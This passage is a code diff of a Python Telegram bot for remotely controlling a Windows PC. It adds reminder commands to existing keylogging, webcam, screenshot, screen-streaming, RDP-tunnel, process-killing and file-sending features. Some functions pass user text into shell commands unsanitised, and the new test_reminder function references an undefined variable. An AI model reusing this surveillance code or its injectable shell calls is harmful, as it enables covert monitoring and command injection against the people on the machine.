@@ -20,10 +20,25 @@ import speech_recognition as sr
 import pyttsx3
 from pyngrok import ngrok
 import joblib
-from telegram import InlineKeyboardMarkup, InlineKeyboardButton, Update, ReplyKeyboardMarkup
+import uuid
+from reminder_db import Reminder
+from reminder_parser import parse_reminder_input
+from reminder_executor import execute_reminder
+from telegram import (
+    InlineKeyboardMarkup,
+    InlineKeyboardButton,
+    Update,
+    ReplyKeyboardMarkup,
+)
 from telegram.ext import ContextTypes
-if (os.getenv("CHAT_BOT_ENABLED") != "False"):
-    from chains import create_agent_tts, create_agent_text, response_formatter_chain, agent_system_prompt
+
+if os.getenv("CHAT_BOT_ENABLED") != "False":
+    from chains import (
+        create_agent_tts,
+        create_agent_text,
+        response_formatter_chain,
+        agent_system_prompt,
+    )
     from models.tool_context import ToolContext
 
 
@@ -71,7 +86,7 @@ class Features:
         """
         load_dotenv()
         self.un_authorized_message = "You are not authorized to use this command."
-        self.nlp_model = joblib.load('text_classifier.joblib')
+        self.nlp_model = joblib.load("text_classifier.joblib")
         self.admin_chat_id = os.getenv("ADMIN_CHAT_ID")
         self.api_key = os.getenv("API_KEY")
         self.admin_name = os.getenv("ADMIN_NAME")
@@ -80,19 +95,22 @@ class Features:
         self.ffmpeg_path_prefix = os.getenv("FFMPEG_PATH_PREFIX")
         self.rdp_port = os.getenv("RDP_PORT", "3389")
         self.rdp_active = False
-        self.chat_bot_enabled = os.getenv(
-            "CHAT_BOT_ENABLED", "True").lower() in ("true", "1", "t")
+        self.chat_bot_enabled = os.getenv("CHAT_BOT_ENABLED", "True").lower() in (
+            "true",
+            "1",
+            "t",
+        )
         self.chat_id_file = 0
-        self.photo_name = 'photo.png'
-        self.authorzed_users = 'authorzed_Users/authorzed_Users.json'
+        self.photo_name = "photo.png"
+        self.authorzed_users = "authorzed_Users/authorzed_Users.json"
         self.key_log_file = "KeyLoger.txt"
-        self.fin = ''
-        self.random_f = ''
-        self.fname = ''
-        self.file_message_id = ''
-        self.server_thread_state = ''
+        self.fin = ""
+        self.random_f = ""
+        self.fname = ""
+        self.file_message_id = ""
+        self.server_thread_state = ""
         self.random = 1
-        self.public_url = ''
+        self.public_url = ""
         self.now = datetime.datetime.now()
         self.authorized = 0
         self.aut_chat_id = 0
@@ -100,6 +118,7 @@ class Features:
         self.logging = False
         self.logger = 0
         self.telegram_bot = telegram_bot
+        self.scheduler_manager = None
         file_found = False
         self.screen_state = False
         self.video_state = False
@@ -108,25 +127,42 @@ class Features:
         self.chat_mode = {}  # Dictionary to store chat modes
         self.nlp_classifier_output = {}  # Dictionary to store NLP classifier outputut
         self.clear_history_flag = {}  # Dictionary to store clear history flag per chat
-        self.keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton('yes', callback_data='yes'), InlineKeyboardButton(
-                'no', callback_data='no')],
-        ])
+        self.keyboard = InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton("yes", callback_data="yes"),
+                    InlineKeyboardButton("no", callback_data="no"),
+                ],
+            ]
+        )
         self.reply_keyboard = ReplyKeyboardMarkup(
-            [['Video Streaming', 'Screen Sharing',],
-             ['Screenshot', 'Photo',],
-             ['Keyloger',  'List Users',],
-             ['Remote Desktop', 'NLP State']],
-            resize_keyboard=True, one_time_keyboard=False)
+            [
+                [
+                    "Video Streaming",
+                    "Screen Sharing",
+                ],
+                [
+                    "Screenshot",
+                    "Photo",
+                ],
+                [
+                    "Keyloger",
+                    "List Users",
+                ],
+                ["Remote Desktop", "NLP State"],
+            ],
+            resize_keyboard=True,
+            one_time_keyboard=False,
+        )
         self.reply_keyboard_to_commad = {
-            'Video Streaming': 'video',
-            'Screen Sharing': 'screen',
-            'Screenshot': 'screenshot',
-            'Photo': 'photo',
-            'Keyloger': 'keylog',
-            'List Users': 'list',
-            'Remote Desktop': 'rdp',
-            'NLP State': 'nlp',
+            "Video Streaming": "video",
+            "Screen Sharing": "screen",
+            "Screenshot": "screenshot",
+            "Photo": "photo",
+            "Keyloger": "keylog",
+            "List Users": "list",
+            "Remote Desktop": "rdp",
+            "NLP State": "nlp",
         }
         self.command_handlers = {
             "send": self.send,
@@ -142,8 +178,13 @@ class Features:
             "list": self.list_users,
             "kick": self.kick_user,
             "rdp": self.start_stop_rdp_tunnel,
-            'nlp': self.set_nlp_flag_async,
-            'clear_history': self.clear_history,
+            "nlp": self.set_nlp_flag_async,
+            "clear_history": self.clear_history,
+            "remind": self.schedule_reminder,
+            "list_reminders": self.list_reminders,
+            "delete_reminder": self.delete_reminder,
+            "test_reminder": self.test_reminder,
+            "schedule_reminder": self.schedule_reminder,
         }
         self._commmand_confrimation_msg = {
             "send": "did you mean to send a document?",
@@ -170,23 +211,45 @@ class Features:
                 print(self.auth_list)
                 file_found = True
             except FileNotFoundError:
-                data = {'authorized': [{'chat_id': None, 'Name': None}]}
-                with open(self.authorzed_users, 'w') as f:
+                data = {"authorized": [{"chat_id": None, "Name": None}]}
+                with open(self.authorzed_users, "w") as f:
                     json.dump(data, f, indent=2)
 
-    async def get_system_status(self, chat_id, command, command_list, first_name, last_name, context, is_form_self=False):
-        state = {'remote_tunnel': self.rdp_active, 'video_streaming': self.video_state,
-                 'screen_sharing': self.screen_state, 'nlp_state': self.no_nlp[chat_id]}
-        system_status_messages = ' Current System Status:\n - remote desktop: ' + \
-            ('ON' if state['remote_tunnel'] else 'OFF') + '\n - live video: ' + \
-            ('ON' if state['video_streaming'] else 'OFF') + '\n - screen sharing: ' + \
-            ('ON' if state['screen_sharing'] else 'OFF') + '\n - NLP: ' + \
-            ('ON' if state['nlp_state'] else 'OFF')
+    async def get_system_status(
+        self,
+        chat_id,
+        command,
+        command_list,
+        first_name,
+        last_name,
+        context,
+        is_form_self=False,
+    ):
+        state = {
+            "remote_tunnel": self.rdp_active,
+            "video_streaming": self.video_state,
+            "screen_sharing": self.screen_state,
+            "nlp_state": self.no_nlp.get(chat_id, True),
+        }
+        system_status_messages = (
+            " Current System Status:\n - remote desktop: "
+            + ("ON" if state["remote_tunnel"] else "OFF")
+            + "\n - live video: "
+            + ("ON" if state["video_streaming"] else "OFF")
+            + "\n - screen sharing: "
+            + ("ON" if state["screen_sharing"] else "OFF")
+            + "\n - NLP: "
+            + ("ON" if state["nlp_state"] else "OFF")
+        )
         if not is_form_self:
-            await context.bot.send_message(chat_id=chat_id, text=f"System Status: {system_status_messages}")
+            await context.bot.send_message(
+                chat_id=chat_id, text=f"System Status: {system_status_messages}"
+            )
         return system_status_messages
 
-    async def set_nlp_flag_async(self, chat_id, command, command_list, first_name, last_name, context):
+    async def set_nlp_flag_async(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
         """
         Sets the NLP flag for the given chat_id.
 
@@ -197,19 +260,145 @@ class Features:
         if self.no_nlp.get(chat_id) is None:
             self.no_nlp[chat_id] = True
         self.no_nlp[chat_id] = not self.no_nlp[chat_id]
-        await context.bot.send_message(chat_id=chat_id, text='NLP enabled' if self.no_nlp[chat_id] else 'NLP disabled')
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="NLP enabled" if self.no_nlp[chat_id] else "NLP disabled",
+        )
 
     async def test_message_async(self, bot):
         """
         Sends a test message to the admin with the IP configuration details.
         """
         i = 2
-        while (i > 0):
-            messag = Popen('ipconfig', shell=True, stdout=PIPE,
-                           text=True).communicate()[0]
-            await bot.send_message(chat_id=self.admin_chat_id, text=messag, reply_markup=self.reply_keyboard)
+        while i > 0:
+            messag = Popen(
+                "ipconfig", shell=True, stdout=PIPE, text=True
+            ).communicate()[0]
+            await bot.send_message(
+                chat_id=self.admin_chat_id,
+                text=messag,
+                reply_markup=self.reply_keyboard,
+            )
             i = i - 1
             await asyncio.sleep(1)
+
+    def set_scheduler_manager(self, scheduler_manager):
+        self.scheduler_manager = scheduler_manager
+
+    async def schedule_reminder(
+        self,
+        chat_id,
+        command,
+        command_list,
+        first_name,
+        last_name,
+        context,
+        is_ai=False,
+    ):
+        """Schedule a reminder from a natural language command."""
+        if self.scheduler_manager is None:
+            await context.bot.send_message(
+                chat_id=chat_id, text="Reminder scheduler is not available."
+            )
+            return
+        natural_text = (
+            command[len(command_list[0]) :].strip() if len(command_list) > 0 else ""
+        )
+        if not natural_text:
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text="Usage: /remind <task> at <time> or /remind remind me tomorrow at 9am",
+            )
+            return
+
+        parsed = parse_reminder_input(natural_text)
+        reminder = Reminder(
+            id=str(uuid.uuid4()),
+            chat_id=chat_id,
+            ai=is_ai,
+            user_id=str(chat_id),
+            trigger_time=parsed["trigger_time"],
+            message=parsed["message"],
+            action_type=parsed["action_type"],
+            action_params=parsed["action_params"],
+            recurrence_pattern=parsed["recurrence_pattern"],
+            is_one_time=parsed["is_one_time"],
+            created_at=datetime.datetime.now(datetime.timezone.utc),
+        )
+        self.scheduler_manager.add_reminder(reminder)
+        recurrence = reminder.recurrence_pattern or "one-time"
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=(
+                f"Reminder scheduled successfully!\n"
+                f"ID: {reminder.id}\n"
+                f"When: {reminder.trigger_time.strftime('%Y-%m-%d %H:%M %Z')}\n"
+                f"Type: {recurrence}\n"
+                f"Message: {reminder.message}"
+            ),
+        )
+
+    async def list_reminders(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
+        """List active reminders for the current user."""
+        if self.scheduler_manager is None:
+            await context.bot.send_message(
+                chat_id=chat_id, text="Reminder scheduler is not available."
+            )
+            return
+        reminders = self.scheduler_manager.list_reminders(chat_id)
+        if not reminders:
+            await context.bot.send_message(
+                chat_id=chat_id, text="You have no active reminders."
+            )
+            return
+
+        lines = []
+        for reminder in reminders:
+            recurrence = reminder.recurrence_pattern or "one-time"
+            lines.append(
+                f"ID: `{reminder.id}`\n"
+                f"When: {reminder.trigger_time.strftime('%Y-%m-%d %H:%M %Z')}\n"
+                f"Type: {recurrence}\n"
+                f"Message: {reminder.message}\n"
+            )
+        await context.bot.send_message(chat_id=chat_id, text="\n".join(lines))
+
+    async def delete_reminder(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
+        """Delete a reminder by ID."""
+        if self.scheduler_manager is None:
+            await context.bot.send_message(
+                chat_id=chat_id, text="Reminder scheduler is not available."
+            )
+            return
+        if len(command_list) < 2:
+            await context.bot.send_message(
+                chat_id=chat_id, text="Usage: /delete_reminder <reminder_id>"
+            )
+            return
+        reminder_id = command_list[1]
+        self.scheduler_manager.remove_reminder(reminder_id)
+        await context.bot.send_message(
+            chat_id=chat_id, text=f"Deleted reminder {reminder_id}."
+        )
+
+    async def test_reminder(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
+        """Execute a reminder immediately for testing."""
+        if len(list_command) < 2:
+            await context.bot.send_message(
+                chat_id=chat_id, text="Usage: /test_reminder <reminder_id>"
+            )
+            return
+        reminder_id = list_command[1]
+        await execute_reminder(self, reminder_id)
+        await context.bot.send_message(
+            chat_id=chat_id, text=f"Triggered reminder {reminder_id} for testing."
+        )
 
     async def live_server(self, chat_id, first_name, last_name, context):
         """
@@ -220,27 +409,39 @@ class Features:
             first_name (str): The first name of the user.
             last_name (str): The last name of the user.
         """
-        if (self.rdp_active):
+        if self.rdp_active:
             await context.bot.send_message(
-                chat_id=chat_id, text="Cannot start/stop live server as RDP tunnel is running on the server")
+                chat_id=chat_id,
+                text="Cannot start/stop live server as RDP tunnel is running on the server",
+            )
             return None
-        if self.server_thread_state == "ON" and not self.video_state and not self.screen_state:
+        if (
+            self.server_thread_state == "ON"
+            and not self.video_state
+            and not self.screen_state
+        ):
             lw.stop_server()
             ngrok.kill()
-            await context.bot.send_message(
-                chat_id=chat_id, text="video feed ended")
+            await context.bot.send_message(chat_id=chat_id, text="video feed ended")
             self.server_thread_state = ""
-            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
+            if not (
+                str(chat_id).startswith(self.admin_chat_id)
+                and str(chat_id).endswith(self.admin_chat_id)
+            ):
                 await context.bot.send_message(
-                    chat_id=self.admin_chat_id, text=f'''live video feed stopped by {first_name} {last_name}.''')
+                    chat_id=self.admin_chat_id,
+                    text=f"""live video feed stopped by {first_name} {last_name}.""",
+                )
         else:
             lw.start_server_in_thread()
-            tunnel = ngrok.connect(5000, 'http')
+            tunnel = ngrok.connect(5000, "http")
             self.public_url = str(tunnel).split('''"''')[1]
             self.server_thread_state = "ON"
         return None
 
-    async def send(self, chat_id, command, command_list, first_name, last_name, context):
+    async def send(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
         """
         Sends a document to the specified chat ID.
 
@@ -252,10 +453,12 @@ class Features:
             last_name (str): The last name of the user.
             context: The context object from python-telegram-bot
         """
-        fp = command[len(command_list[0]) + 1:]
-        await context.bot.send_document(chat_id=chat_id, document=open(fp, 'rb'))
+        fp = command[len(command_list[0]) + 1 :]
+        await context.bot.send_document(chat_id=chat_id, document=open(fp, "rb"))
 
-    async def video(self, chat_id, command, command_list, first_name, last_name, context):
+    async def video(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
         """
         Toggles the video state and manages the live server accordingly.
 
@@ -267,24 +470,37 @@ class Features:
             last_name (str): The last name of the user.
             context: The context object from python-telegram-bot
         """
-        print('hi')
+        print("hi")
         self.video_state = not self.video_state
         if self.video_state:
             if self.server_thread_state != "ON":
                 await self.live_server(chat_id, first_name, last_name, context)
-            await context.bot.send_message(chat_id=chat_id, text=f'''for live video feed visit
-{self.public_url}''')
-            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
-                await context.bot.send_message(chat_id=self.admin_chat_id, text=f'''live video feed started by {first_name} {last_name} visit
-{self.public_url}''')
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"""for live video feed visit
+{self.public_url}""",
+            )
+            if not (
+                str(chat_id).startswith(self.admin_chat_id)
+                and str(chat_id).endswith(self.admin_chat_id)
+            ):
+                await context.bot.send_message(
+                    chat_id=self.admin_chat_id,
+                    text=f"""live video feed started by {first_name} {last_name} visit
+{self.public_url}""",
+                )
         else:
             if not self.screen_state and not self.video_state:
                 await self.live_server(chat_id, first_name, last_name, context)
             else:
                 await context.bot.send_message(
-                    chat_id=chat_id, text='Cannot stop server as other services are running on the server')
+                    chat_id=chat_id,
+                    text="Cannot stop server as other services are running on the server",
+                )
 
-    async def screen(self, chat_id, command, command_list, first_name, last_name, context):
+    async def screen(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
         """
         Toggles the screen state and manages the live server accordingly.
 
@@ -301,19 +517,32 @@ class Features:
             if self.server_thread_state != "ON":
                 await self.live_server(chat_id, first_name, last_name, context)
 
-            await context.bot.send_message(chat_id=chat_id, text=f'''for live Screen feed visit
-{self.public_url}/screen''')
-            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
-                await context.bot.send_message(chat_id=self.admin_chat_id, text=f'''live Screen feed started by {first_name} {last_name} visit
-{self.public_url}/screen''')
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"""for live Screen feed visit
+{self.public_url}/screen""",
+            )
+            if not (
+                str(chat_id).startswith(self.admin_chat_id)
+                and str(chat_id).endswith(self.admin_chat_id)
+            ):
+                await context.bot.send_message(
+                    chat_id=self.admin_chat_id,
+                    text=f"""live Screen feed started by {first_name} {last_name} visit
+{self.public_url}/screen""",
+                )
         else:
             if not self.screen_state and not self.video_state:
                 await self.live_server(chat_id, first_name, last_name, context)
             else:
                 await context.bot.send_message(
-                    chat_id=chat_id, text='Cannot stop server as other services are running on the server')
+                    chat_id=chat_id,
+                    text="Cannot stop server as other services are running on the server",
+                )
 
-    async def download_file_async(self, msg, key, update: Update, context: ContextTypes.DEFAULT_TYPE):  # NOSONAR
+    async def download_file_async(
+        self, msg, key, update: Update, context: ContextTypes.DEFAULT_TYPE
+    ):  # NOSONAR
         """
         Downloads a file from a message and handles authorization.
 
@@ -334,8 +563,8 @@ class Features:
         self.chat_id_file = chat_id
         authorized = False
         if self.pending == 0 or chat_id != self.aut_chat_id:
-            for i in self.auth_list['authorized']:
-                if i['chat_id'] == chat_id:
+            for i in self.auth_list["authorized"]:
+                if i["chat_id"] == chat_id:
                     authorized = True
                     break
         if authorized:
@@ -351,11 +580,17 @@ class Features:
                 fid = message.photo[-1].file_id
             # Video
             elif message.video:
-                filename = message.video.file_name or f"video_{message.video.file_unique_id[:6]}.mp4"
+                filename = (
+                    message.video.file_name
+                    or f"video_{message.video.file_unique_id[:6]}.mp4"
+                )
                 fid = message.video.file_id
             # Audio
             elif message.audio:
-                filename = message.audio.file_name or f"audio_{message.audio.file_unique_id[:6]}.mp3"
+                filename = (
+                    message.audio.file_name
+                    or f"audio_{message.audio.file_unique_id[:6]}.mp3"
+                )
                 fid = message.audio.file_id
             # Voice
             elif message.voice:
@@ -367,54 +602,77 @@ class Features:
             print(f"#############{self.fname}")
             # print(f"#############  {fid}, {message.audio.file_id}")
             resp = requests.get(
-                url=f"https://api.telegram.org/bot{self.api_key}/getFile?file_id={fid}")
+                url=f"https://api.telegram.org/bot{self.api_key}/getFile?file_id={fid}"
+            )
             resp = resp.json()
             if resp["ok"] == False:
                 await context.bot.send_message(
-                    chat_id=chat_id, text=resp["description"])
+                    chat_id=chat_id, text=resp["description"]
+                )
                 return False, ""
             fp = resp["result"]["file_path"]
             if key != key_list[4]:
-                self.fname = fp[fp.index('/')+1:]
+                self.fname = fp[fp.index("/") + 1 :]
             self.fin = requests.get(
-                url=f"https://api.telegram.org/file/bot{self.api_key}/{fp}", allow_redirects=True)
+                url=f"https://api.telegram.org/file/bot{self.api_key}/{fp}",
+                allow_redirects=True,
+            )
             speach_recon = False
-            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
+            if not (
+                str(chat_id).startswith(self.admin_chat_id)
+                and str(chat_id).endswith(self.admin_chat_id)
+            ):
                 if self.fname.endswith(".oga"):
-                    with open(safe_join('downloads', self.fname), "wb") as f:
+                    with open(safe_join("downloads", self.fname), "wb") as f:
                         f.write(self.fin.content)
                     speach_recon, text = await self.recognise_speech_and_do(
-                        chat_id, self.fname, f"{message.chat.first_name} {message.chat.last_name}", context)
+                        chat_id,
+                        self.fname,
+                        f"{message.chat.first_name} {message.chat.last_name}",
+                        context,
+                    )
                     return speach_recon, text
                 else:
                     print(self.admin_chat_id)
                     self.random_f = str(secrets.token_hex(32)).upper()
-                    text = ''
+                    text = ""
                     await context.bot.send_message(
-                        chat_id=chat_id, text=f'{self.admin_name} will tell you the authorization code')
+                        chat_id=chat_id,
+                        text=f"{self.admin_name} will tell you the authorization code",
+                    )
                     await context.bot.send_message(
-                        chat_id=self.admin_chat_id, text=f"do you want to receive {key} send a key to {message.chat.first_name} {message.chat.last_name} of ")
+                        chat_id=self.admin_chat_id,
+                        text=f"do you want to receive {key} send a key to {message.chat.first_name} {message.chat.last_name} of ",
+                    )
                     await context.bot.send_message(
-                        chat_id=self.admin_chat_id, text=self.random_f)
+                        chat_id=self.admin_chat_id, text=self.random_f
+                    )
                     return speach_recon, text
             else:
-                text = ''
-                with open(safe_join('downloads', self.fname), "wb") as f:
+                text = ""
+                with open(safe_join("downloads", self.fname), "wb") as f:
                     f.write(self.fin.content)
                 if self.fname.endswith(".oga"):
                     speach_recon, text = await self.recognise_speech_and_do(
-                        chat_id, self.fname, f"{message.chat.first_name} {message.chat.last_name}", context)
+                        chat_id,
+                        self.fname,
+                        f"{message.chat.first_name} {message.chat.last_name}",
+                        context,
+                    )
 
                 self.chat_id_file = 0
                 self.fin = ""
                 await context.bot.send_message(
-                    chat_id=chat_id, text=f'file saved as {self.fname}')
+                    chat_id=chat_id, text=f"file saved as {self.fname}"
+                )
                 self.fname = ""
 
                 self.file_message_id = "aa"
                 return speach_recon, text
 
-    async def recognise_speech_and_do(self, chat_id, fname, name, context: ContextTypes.DEFAULT_TYPE = None):
+    async def recognise_speech_and_do(
+        self, chat_id, fname, name, context: ContextTypes.DEFAULT_TYPE = None
+    ):
         """
         Recognizes speech from an audio file and sends the text to the user.
 
@@ -427,10 +685,11 @@ class Features:
         Returns:
             tuple: A tuple indicating if speech recognition was successful and the recognized text.
         """
-        convert_command = f'{self.ffmpeg_path_prefix}ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
+        convert_command = f"{self.ffmpeg_path_prefix}ffmpeg -y -i downloads/{fname} downloads/{fname}.wav"
         print(convert_command)
-        message = Popen(convert_command, shell=True,
-                        stdout=PIPE, text=True).communicate()[0]
+        message = Popen(
+            convert_command, shell=True, stdout=PIPE, text=True
+        ).communicate()[0]
         text = ""
         print(message)
         speach = sr.Recognizer()
@@ -444,18 +703,20 @@ class Features:
             os.remove(f"downloads/{fname}")
         except sr.UnknownValueError:
             await context.bot.send_message(
-                chat_id=chat_id, text=f"Didn't get what you said {name}")
-        print('deleted')
+                chat_id=chat_id, text=f"Didn't get what you said {name}"
+            )
+        print("deleted")
         print(text)
-        await context.bot.send_message(
-            chat_id=chat_id, text=f'you said {text}')
+        await context.bot.send_message(chat_id=chat_id, text=f"you said {text}")
         self.chat_id_file = 0
         self.fin = ""
         fname = ""
         self.file_message_id = "aa"
         return True, text
 
-    async def speak(self, chat_id, command, command_list, first_name, last_name, context):
+    async def speak(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
         """
         Converts text to speech and plays it.
 
@@ -471,7 +732,7 @@ class Features:
         x = len(command_list[0])
         speak.say(command[x:])
         speak.runAndWait()
-        return 'text spoken using system TTS engine'
+        return "text spoken using system TTS engine"
 
     async def save_file_in_fin(self, chat_id):
         """
@@ -480,15 +741,17 @@ class Features:
         Args:
             chat_id (int): The chat ID of the user.
         """
-        with open(safe_join('downloads', self.fname), "wb") as f:
+        with open(safe_join("downloads", self.fname), "wb") as f:
             f.write(self.fin.content)
         self.chat_id_file = 0
         self.fin = ""
-        await self.telegram_bot.send_message(chat_id, f'file saved as {self.fname}')
+        await self.telegram_bot.send_message(chat_id, f"file saved as {self.fname}")
         self.fname = ""
         self.file_message_id = "aa"
 
-    async def take_screenshot(self, chat_id, command, command_list, first_name, last_name, context):
+    async def take_screenshot(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
         """
         Takes a screenshot and sends it to the specified chat ID.
 
@@ -502,12 +765,14 @@ class Features:
         """
         print("scr")
         img = pyscreenshot.grab()
-        img.save('screen.png')
-        await context.bot.send_photo(chat_id=chat_id, photo=open("screen.png", 'rb'))
+        img.save("screen.png")
+        await context.bot.send_photo(chat_id=chat_id, photo=open("screen.png", "rb"))
         os.remove("screen.png")
-        return 'Screenshot taken and sent'
+        return "Screenshot taken and sent"
 
-    async def kill_task(self, chat_id, command, command_list, first_name, last_name, context):
+    async def kill_task(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
         """
         Kills a task based on the provided command.
 
@@ -519,15 +784,18 @@ class Features:
             last_name (str): The last name of the user.
             context: The context object from python-telegram-bot
         """
-        command_exec = f'''Taskkill /f /Im "{command_list[1]}.exe" /t'''
+        command_exec = f"""Taskkill /f /Im "{command_list[1]}.exe" /t"""
         if len(command_list) == 2:
-            message = Popen(command_exec, shell=True,
-                            stdout=PIPE, text=True).communicate()[0]
+            message = Popen(
+                command_exec, shell=True, stdout=PIPE, text=True
+            ).communicate()[0]
         else:
-            message = 'Invalid command'
+            message = "Invalid command"
         await context.bot.send_message(chat_id=chat_id, text=message)
 
-    async def keyboard_type(self, chat_id, command, command_list, first_name, last_name, context):
+    async def keyboard_type(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
         """
         Simulates keyboard typing of the given command.
 
@@ -539,12 +807,14 @@ class Features:
             last_name (str): The last name of the user.
             context: The context object from python-telegram-bot
         """
-        pyautogui.typewrite(command[len(command_list[0])+1:], interval=0.06)
+        pyautogui.typewrite(command[len(command_list[0]) + 1 :], interval=0.06)
 
         print(f"typed {command[len(command_list[0])+1:]}")
-        return 'typed text with keyboard controller'
+        return "typed text with keyboard controller"
 
-    async def take_photo(self, chat_id, command, command_list, first_name, last_name, context):
+    async def take_photo(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
         """
         Takes a photo using the webcam and sends it to the specified chat ID.
 
@@ -559,8 +829,9 @@ class Features:
         vod = cv2.VideoCapture(0)
         if not vod.isOpened():
             await context.bot.send_message(
-                chat_id=chat_id, text="No camera attached or accessible.")
-            return 'no camera found'
+                chat_id=chat_id, text="No camera attached or accessible."
+            )
+            return "no camera found"
 
         ret, img = vod.read()
         vod.release()
@@ -568,14 +839,19 @@ class Features:
         if ret:
             cv2.imwrite(self.photo_name, img)
             await context.bot.send_photo(
-                chat_id=chat_id, photo=open(self.photo_name, 'rb'))
+                chat_id=chat_id, photo=open(self.photo_name, "rb")
+            )
             os.remove(self.photo_name)
-            return 'photo taken and sent'
+            return "photo taken and sent"
         else:
-            await context.bot.send_message(chat_id=chat_id, text="Failed to capture image.")
-            return 'failed to capture image'
+            await context.bot.send_message(
+                chat_id=chat_id, text="Failed to capture image."
+            )
+            return "failed to capture image"
 
-    async def key_logger(self, chat_id, command, command_list, first_name, last_name, context):
+    async def key_logger(
+        self, chat_id, command, command_list, first_name, last_name, context
+    ):
         """
         Starts or stops the key logger based on the current logging state.
 
@@ -594,24 +870,37 @@ class Features:
             self.logger.start()
             await context.bot.send_message(chat_id=chat_id, text="Key logger started")
             self.logging = True
-            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
+            if not (
+                str(chat_id).startswith(self.admin_chat_id)
+                and str(chat_id).endswith(self.admin_chat_id)
+            ):
                 await context.bot.send_message(
-                    chat_id=self.admin_chat_id, text=f'''Key logger started by {first_name} {last_name}.''')
+                    chat_id=self.admin_chat_id,
+                    text=f"""Key logger started by {first_name} {last_name}.""",
+                )
         else:
             self.logger.stop()
             await context.bot.send_message(chat_id=chat_id, text="Key logger stopped")
             await context.bot.send_document(
-                chat_id=chat_id, document=open(self.key_log_file, "rb"))
-            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
-                await context.bot.send_message(chat_id=self.admin_chat_id, text=f'''Key logger stopped by {first_name} {last_name},
-here is log''')
+                chat_id=chat_id, document=open(self.key_log_file, "rb")
+            )
+            if not (
+                str(chat_id).startswith(self.admin_chat_id)
+                and str(chat_id).endswith(self.admin_chat_id)
+            ):
+                await context.bot.send_message(
+                    chat_id=self.admin_chat_id,
+                    text=f"""Key logger stopped by {first_name} {last_name},
+here is log""",
+                )
                 await context.bot.send_document(
-                    chat_id=self.admin_chat_id, document=open(self.key_log_file, "rb"))
+                    chat_id=self.admin_chat_id, document=open(self.key_log_file, "rb")
+                )
             x = open(self.key_log_file, "w")
             x.close()
             os.remove(self.key_log_file)
             self.logging = False
-            return 'key logger started' if self.logging else 'key logger stopped'
+            return "key logger started" if self.logging else "key logger stopped"
 
     async def send_first_auth_code_async(self, chat_id, name, context):
         """
@@ -625,15 +914,18 @@ here is log''')
         self.random = str(secrets.token_hex(6)).upper()
         print(self.random, type(self.random))
 
+        await context.bot.send_message(chat_id=self.admin_chat_id, text=self.random)
         await context.bot.send_message(
-            chat_id=self.admin_chat_id, text=self.random)
-        await context.bot.send_message(chat_id=self.admin_chat_id, text=str(
-            'do you want to authorize ' + name))
+            chat_id=self.admin_chat_id, text=str("do you want to authorize " + name)
+        )
 
         await context.bot.send_message(
-            chat_id=chat_id, text=f'you are not an authorized user please contact {self.admin_name}')
+            chat_id=chat_id,
+            text=f"you are not an authorized user please contact {self.admin_name}",
+        )
         await context.bot.send_message(
-            chat_id=chat_id, text=f'{self.pronoun} will tell you the authorization code')
+            chat_id=chat_id, text=f"{self.pronoun} will tell you the authorization code"
+        )
         self.aut_chat_id = chat_id
         self.pending = 1
         print(self.pending, self.aut_chat_id)
@@ -651,18 +943,20 @@ here is log''')
         print(self.random)
         if command == self.random:
             await context.bot.send_message(
-                chat_id=chat_id, text=str('you are authorized ' + name), reply_markup=self.reply_keyboard)
-            new_guy = {'chat_id': chat_id, 'Name': name}
+                chat_id=chat_id,
+                text=str("you are authorized " + name),
+                reply_markup=self.reply_keyboard,
+            )
+            new_guy = {"chat_id": chat_id, "Name": name}
             print(new_guy)
-            self.auth_list['authorized'].append(new_guy)
+            self.auth_list["authorized"].append(new_guy)
             print(self.auth_list)
             self.pending = 0
-            with open(self.authorzed_users, 'w') as f:
+            with open(self.authorzed_users, "w") as f:
                 json.dump(self.auth_list, f, indent=2)
                 f.close()
         else:
-            await context.bot.send_message(
-                chat_id=chat_id, text='sorry invalid code')
+            await context.bot.send_message(chat_id=chat_id, text="sorry invalid code")
 
     def record_message(self, chat_id, message):
         """
@@ -706,9 +1000,11 @@ here is log''')
             chat_id (int): The chat ID of the user.
             mode (str): The chat mode to be set.
         """
-        self.chat_mode[chat_id] = 'ai' if is_ai else 'non_ai'
+        self.chat_mode[chat_id] = "ai" if is_ai else "non_ai"
 
-    async def retrieve_command_predictions_async(self, chat_id, command, list_command, first_name, last_name, context):
+    async def retrieve_command_predictions_async(
+        self, chat_id, command, list_command, first_name, last_name, context
+    ):
         """
         Retrieves the predictions for the given command. If the prediction confidence is low, it asks for confirmation.
 
@@ -728,14 +1024,32 @@ here is log''')
         print(self.nlp_model.classes_.tolist()[predictons.argmax()])
         if predictons.tolist()[0][predictons.argmax()] < 0.5:
             self.nlp_classifier_output[chat_id] = {
-                'command': command, 'prediction': self.nlp_model.classes_.tolist()[predictons.argmax()]}
-            await context.bot.send_message(chat_id=chat_id, text=self._commmand_confrimation_msg[self.nlp_model.classes_.tolist()[
-                predictons.argmax()]], reply_markup=self.keyboard)
+                "command": command,
